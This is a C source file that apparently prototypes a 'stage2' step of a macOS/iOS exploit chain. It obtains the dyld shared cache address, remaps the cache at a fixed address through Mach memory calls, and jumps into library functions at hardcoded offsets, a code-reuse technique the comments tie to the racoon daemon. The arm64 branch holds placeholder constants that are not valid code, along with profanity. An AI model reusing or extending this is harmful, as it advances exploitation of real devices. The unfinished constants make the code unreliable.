#include <stdint.h>
#include <stdio.h>
#include <mach/mach.h>

extern int syscall(int, ...);

#ifdef __x86_64__
#   define REMAP_ADDR 0x110000000
#   define REMAP_SIZE 0x2fe4a000    /* __TEXT segment only */
#   define JUMP_ADDR  0x2fc246f0    /* cache offset of write() */
#   define END_ADDR   0x2fc2211c    /* cache offset of __exit() */
#elif defined(__arm64__)
#   define REMAP_ADDR 0x101000000
#   define REMAP_SIZE bitch what do I know /* __TEXT segment only */
#   define JUMP_ADDR  0xwhatever
#   define END_ADDR   0xyolo
#else
#   error fuck is a blob
#endif

extern void goodbye(int fd, void *buf, size_t len, uint64_t fn, uint64_t x30) __attribute__((noreturn));

__asm__
(
    "_goodbye:\n"
#ifdef __x86_64__
    "mov %r8, 0(%rsp)\n"
    "jmp *%rcx\n"
#else
    "mov x30, x4\n"
    "br x3\n"
#endif
);

int main(void)
{
    // we'll get this for free in racoon
    uint64_t cache_addr = 0;
    syscall(294, &cache_addr);
    printf("cache: %16llx\n", cache_addr);

    // ---------- STAGE2 START ----------
    // 1. make memory entry from cache
    // 2. remap to 0x101000000
    kern_return_t ret = 0;
    task_t self = mach_task_self();

    // Get handle
    memory_object_size_t sz = REMAP_SIZE;
    mach_port_t handle = MACH_PORT_NULL;
    ret = mach_make_memory_entry_64(self, &sz, cache_addr, MAP_MEM_VM_SHARE | VM_PROT_IS_MASK | VM_PROT_ALL, &handle, MACH_PORT_NULL);
    printf("entry: %x, %s\n", handle, mach_error_string(ret));

    // Map handle
    mach_vm_offset_t addr = REMAP_ADDR;
    ret = mach_vm_map(self, &addr, REMAP_SIZE, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, handle, 0, 0, VM_PROT_READ | VM_PROT_EXECUTE, VM_PROT_READ | VM_PROT_EXECUTE, VM_INHERIT_NONE);
    printf("remap: %s\n", mach_error_string(ret));

    // Jump somewhere
    goodbye(1, "le test\n", 8, addr + JUMP_ADDR, addr + END_ADDR);

    return 0;
}
